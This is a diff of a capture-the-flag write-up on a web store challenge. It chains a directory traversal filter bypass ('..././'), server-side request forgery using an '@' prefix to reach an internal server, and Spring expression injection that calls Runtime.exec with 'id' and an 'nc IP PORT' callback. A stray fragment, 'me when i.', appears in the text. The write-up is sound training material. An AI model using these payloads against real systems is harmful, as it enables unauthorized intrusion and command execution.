@@ -25,7 +25,7 @@ Starting off with "Download PDF" on our desired TV, revealed us some interesting
 
 ![Download PDF TV product](https://gyazo.com/128fd40b03d94ce50ebd7c402f987016.png)
 
-As we can already identify, a GET request is being sent to "/downloadFile" endpoint with a very interesting parameter, which is `file`, and it actually specifies a file that is stored on the webserver. Usually applications should validate user input, so when a page receives the given input it will escape all unauthorized signs as of **`/`** , **'.'**. So we can send some of the following right at the begining of the desired file:
+As we can already identify, a GET request is being sent to "/downloadFile" endpoint with a very interesting parameter, which is `file`, and it actually specifies a file that is stored on the web server. Usually, applications should validate user input, so when a page receives the given input it will escape all unauthorized signs as of **`/`**, **`.`**. So we can send some of the following at the beginning of the desired file:
 
 > **`..`**
 > **`../`**
@@ -48,13 +48,13 @@ echo file_get_contents('../pages/'.$sanitized_value.'.php');
 
 its very simple, the `page` parameter receives its value via `GET` request, now the `banned_array[]` contains all the "bad signs" that could allow directory traversal. Then it will use `str_replace` to remove each value inside `banned_array[]` and store it in a new parameter `sanitized_value`. so if we set the `page` parameter to "../file", the final result of `sanitized_value` will be "file".
 
-Our first hint was to try and look for "main.go" file that is probablly located somewhere on the server, so let's grab it.
+Our first hint was to try and look for "main.go" file that is probably located somewhere on the server, so let's grab it.
 
 We will try some traditional directory traversal patterns, adding by `../` just before "main.go" in order to go back one folder.
 
 ![Testing file param](https://gyazo.com/43079f57389c26f370a0f7e339b7e813.png)
 
-Checking the presented response it looks like we are on the same folder ("downloads"), so it seems that there is some user input validation here, which filters out `../`. lets try and bypass it with **encoded traversal strings**, as an example **`..././`**.
+Checking the presented response it looks like we are in the same folder ("downloads"), so it seems that there is some user input validation here, which filters out `../`. let's try and bypass it with **encoded traversal strings**, as an example **`..././`**.
 
 ![Got our LFI](https://gyazo.com/c0fa593feec6e2c9eea6a9ee1f182c2a.png)
 
@@ -66,35 +66,35 @@ We will go step by step on each relevant piece of code in order to seek our flaw
 
 ```
 var (
-	RESOURCE_SERVER = "http://127.0.0.1"
-	DOWNLOAD_DIRECTORY = "./downloads/"
-	ILLEGAL_CHARS = []string {
-		"../",
-		"<!--",
-		"-->",
-		"<",
-		">",
-		"'",
-		"\"",
-		"&",
-		"$",
-		"#",
-		"{", "}", "[", "]", "=",
-		";", "?", "%20", "%22",
-		"%3c",   // <
-		"%253c", // <
-		"%3e",   // >
-		"",   // > -- fill in with % 0 e - without spaces in between
-		"%28",   // (
-		"%29",   // )
-		"%2528", // (
-		"%26",   // &
-		"%24",   // $
-		"%3f",   // ?
-		"%3b",   // ;
-		"%3d",   // =
-	}
-	CALCULATION_SERVER = "http://10.0.0.185:8080/calc"
+    RESOURCE_SERVER = "http://127.0.0.1"
+    DOWNLOAD_DIRECTORY = "./downloads/"
+    ILLEGAL_CHARS = []string {
+        "../",
+        "<!--",
+        "-->",
+        "<",
+        ">",
+        "'",
+        "\"",
+        "&",
+        "$",
+        "#",
+        "{", "}", "[", "]", "=",
+        ";", "?", "%20", "%22",
+        "%3c",   // <
+        "%253c", // <
+        "%3e",   // >
+        "",   // > -- fill in with % 0 e - without spaces in between
+        "%28",   // (
+        "%29",   // )
+        "%2528", // (
+        "%26",   // &
+        "%24",   // $
+        "%3f",   // ?
+        "%3b",   // ;
+        "%3d",   // =
+    }
+    CALCULATION_SERVER = "http://10.0.0.185:8080/calc"
 )
 ```
 
@@ -108,51 +108,51 @@ Focusing on the `main()` function shows us the path of each page following their
 
 ```golang
 func main() {
-	r := mux.NewRouter()
+    r := mux.NewRouter()
 
-	// Dynamic Pages
-	r.HandleFunc("/getResource", getResource).Queries("path", "{path}")
-	r.HandleFunc("/downloadFile", downloadFile).Queries("file", "{file}")
-	r.HandleFunc("/calc", calc)
-	r.HandleFunc("/login", login)
+    // Dynamic Pages
+    r.HandleFunc("/getResource", getResource).Queries("path", "{path}")
+    r.HandleFunc("/downloadFile", downloadFile).Queries("file", "{file}")
+    r.HandleFunc("/calc", calc)
+    r.HandleFunc("/login", login)
 ```
 
 The first function we are going to investigate is the `getResource()` function that is set under "/getResource" page.
 
 ```golang
 func getResource(w http.ResponseWriter, r *http.Request) {
-	path := mux.Vars(r)["path"]
-	path = strings.Replace(path, " ", "%20", -1)
-	req, err := http.NewRequest("POST", RESOURCE_SERVER + path, nil)
-	req.Header.Set("Host", strings.Split(RESOURCE_SERVER, "//")[1])
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	if err != nil {
-		errorHandler(w, r, http.StatusInternalServerError, "")
-		return
-	}
-	client := &http.Client{}
-	res, err := client.Do(req)
-	if err != nil {
-		errorHandler(w, r, http.StatusInternalServerError, "Resource Server Connection Error")
-		return
-	}
+    path := mux.Vars(r)["path"]
+    path = strings.Replace(path, " ", "%20", -1)
+    req, err := http.NewRequest("POST", RESOURCE_SERVER + path, nil)
+    req.Header.Set("Host", strings.Split(RESOURCE_SERVER, "//")[1])
+    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+    if err != nil {
+        errorHandler(w, r, http.StatusInternalServerError, "")
+        return
+    }
+    client := &http.Client{}
+    res, err := client.Do(req)
+    if err != nil {
+        errorHandler(w, r, http.StatusInternalServerError, "Resource Server Connection Error")
+        return
+    }
 
-	defer res.Body.Close()
-	body, _ := ioutil.ReadAll(res.Body)
-	response := string(body)
-	w.Header().Set("Content-Type", "application/json")
-	w.Header().Set("Server", "Golang HTTP Server")
-	fmt.Fprint(w, response)
+    defer res.Body.Close()
+    body, _ := ioutil.ReadAll(res.Body)
+    response := string(body)
+    w.Header().Set("Content-Type", "application/json")
+    w.Header().Set("Server", "Golang HTTP Server")
+    fmt.Fprint(w, response)
 }
 ```
 
-The function takes two arguments: `http.ResponseWriter` which its value assembles the HTTP server's response, and http.Request which is a data structure that represents the client HTTP request. When invoking this function by accessing "/getResource" endpoint with `GET` method and `path` parameter, a new `POST` request will be sent to `RESOURCE_SERVER` which is 127.0.0.1, following the `path` value afterwards. If we set `path` as "/test", then we will trigger the next request : 
+The function takes two arguments: `http.ResponseWriter` which its value assembles the HTTP server's response, and http.Request which is a data structure that represents the client HTTP request. When invoking this function by accessing "/getResource" endpoint with `GET` method and `path` parameter, a new `POST` request will be sent to `RESOURCE_SERVER` which is 127.0.0.1, following the `path` value afterward. If we set `path` as "/test", then we will trigger the next request : 
 
 ```
 POST http://127.0.0.1/test HTTP/1.1
 ```
 
-Wait a minute... we can now send an HTTP request to any external and internal targets! and we got an interesting **internal calcuation server**, if the bell doesn't ring stay tuned for the next part.
+Wait a minute... we can now send an HTTP request to any external and internal targets! and we got an interesting **internal calculation server**, if the bell doesn't ring stay tuned for the next part.
 
 ## Testing SSRF
 
@@ -168,18 +168,18 @@ POST http://127.0.0.1/10.0.0.185:8080 HTTP/1.1
 
 Which will result as an internal server error, so we must bypass it in a way that the server will ignore "127.0.0.1" address. 
 
-Maybe it relates to our second hint ?
+Maybe it relates to our second hint?
 
 ![Second hint](https://gyazo.com/c3ef920c2d2e5e878733b9a7d3ea7327.png)
 
 Black hat, Orange, and tsai? well lucky we have Google.
 
 
-So we get that its a famous hacker (which I personally respect alot), and his recent publishment on ways to exploit SSRF.
+So we get that it's a famous hacker (which I personally respect a lot), and his recent publishment on ways to exploit SSRF.
 
 ![Google search](https://gyazo.com/d9dde342999d41b7524872a66dcddd48.png)
 
-After exploring his method of bypassing common URL parsers, We can figure out that by adding the "@" sign at the start of `path` parameter, will ingore "127.0.0.1" on the request.
+After exploring his method of bypassing common URL parsers, We can figure out that by adding the "@" sign at the start of `path` parameter, will ignore "127.0.0.1" on the request.
 
 ![Filtering Bypass](https://gyazo.com/fc658ab20e11427a24a180c44fe9008d.png) 
 
@@ -187,34 +187,34 @@ Now that we have got our SSRF working, we must understand how does the `calc()` 
 
 ## Back to the Code
 
-First lets dive into the `calc()` function, and figure out what it does.
+First, lets dive into the `calc()` function, and figure out what it does.
 
 ```golang
 func calc (w http.ResponseWriter, r *http.Request) {
-	item_id := r.URL.Query().Get("item_id")
-	country_code := r.URL.Query().Get("country_code")
-	quantity := r.URL.Query().Get("quantity")
-	if item_id == "" || country_code == "" || quantity == "" {
-		errorHandler(w, r, http.StatusInternalServerError, "Invalid Parameters")
-		return
-	}
-	_, err := strconv.Atoi(quantity)
-	if err == nil {
-		query := "?item_id=" + item_id + "&" + "country_code=" + country_code + "&" + "quantity=" + quantity
-		req, err := http.NewRequest("POST", CALCULATION_SERVER + query, nil)
-		req.Header.Set("Host", strings.Split(CALCULATION_SERVER, "//")[1])
-		{redacted}
+    item_id := r.URL.Query().Get("item_id")
+    country_code := r.URL.Query().Get("country_code")
+    quantity := r.URL.Query().Get("quantity")
+    if item_id == "" || country_code == "" || quantity == "" {
+        errorHandler(w, r, http.StatusInternalServerError, "Invalid Parameters")
+        return
+    }
+    _, err := strconv.Atoi(quantity)
+    if err == nil {
+        query := "?item_id=" + item_id + "&" + "country_code=" + country_code + "&" + "quantity=" + quantity
+        req, err := http.NewRequest("POST", CALCULATION_SERVER + query, nil)
+        req.Header.Set("Host", strings.Split(CALCULATION_SERVER, "//")[1])
+        {redacted}
 ```
 
-When analysing the `calc()` function we see that a `POST` request is being sent to `CALCULATION_SERVER`, following three parameters: `item_id`, `country_code`, and `quantity`.
+When analyzing the `calc()` function we see that a `POST` request is being sent to `CALCULATION_SERVER`, following three parameters: `item_id`, `country_code`, and `quantity`.
 Sending the request with random numbers actually worked.
 me when i.
 
 ![Sending a request to calc](https://gyazo.com/d5cafc6762797fe0d70708e4d8d2c70d.png)
 
-Hold it! We are trying to send a request with parameters to a different webserver, via "SmartStore" website. So we must URL encode the ampersand "&" which equals to "%26", and by that the second/third parameter will reach to our internal web server, and not to the "SmartStore" webserver.
+Hold it! We are trying to send a request with parameters to a different web server, via "SmartStore" website. So we must URL encode the ampersand "&" which equals to "%26", and by that the second/third parameter will reach to our internal web server, and not to the "SmartStore" web server.
 
-If We fuzz around with the parameters value, We will notice that `country_code` parameter does not effect the given output, On the other hand `quantity` **does return its value in the response output** when inserting numeric digits.
+If We fuzz around with the parameters value, We will notice that `country_code` parameter does not affect the given output, On the other hand `quantity` **does return its value in the response output** when inserting numeric digits.
 
 ![Quantity is being returned](https://gyazo.com/8cf7a909ed384e73dfc234978e974460.png)
 
@@ -232,7 +232,7 @@ Obviously "Expression Language" is being used here, So cancel all your appointme
 We can take some time and read an amazing EL Injection in Spring Boot by "deadpool" ![Link to deadpool blog](http://deadpool.sh/2017/RCE-Springs/).
 
 So we can try and send a request with an injection that will execute a given command using the java's `Runtime` class, following by the `exec()` method. We will check if we can execute any command.
-We will use the linux `id` command, just to verify that we can execute code on the target webserver.
+We will use the Linux `id` command, just to verify that we can execute code on the target web server.
 
 ```java
 T(java.lang.Runtime).getRuntime().exec('id')
@@ -240,7 +240,7 @@ T(java.lang.Runtime).getRuntime().exec('id')
 ```
 ![ID via ELi](https://gyazo.com/25f08203df2de8f37b453df5ecacf125.png)
 
-The request hangs for like 40 seconds, and we dont get any output in the HTTP response, so why not sending a command that doesn't require an HTTP response?
+The request hangs for like 40 seconds, and we don't get any output in the HTTP response, so why not sending a command that doesn't require an HTTP response?
 let's set an "nc" listener, and set `quantity` value to the next payload:
 
 ```java
@@ -249,7 +249,7 @@ T(java.lang.Runtime).getRuntime().exec('nc%20IP%20PORT')
 ```
 ![NC via ELi](https://gyazo.com/3489861369a70b000067419aa54f530e.png)
 
-Nice, so we **verified our code execution** on the webserver, lets try and grab our flag. 
+Nice, so we **verified our code execution** on the web server, let's try and grab our flag. 
 
 So in order to get output in the HTTP Response, we will use the "Spring Framework" `StreamUtils` class and call the `copyToString()` method. We can pass an input stream to this method and get the contents of the stream as a response.
 the finaly payload should look like the following: 
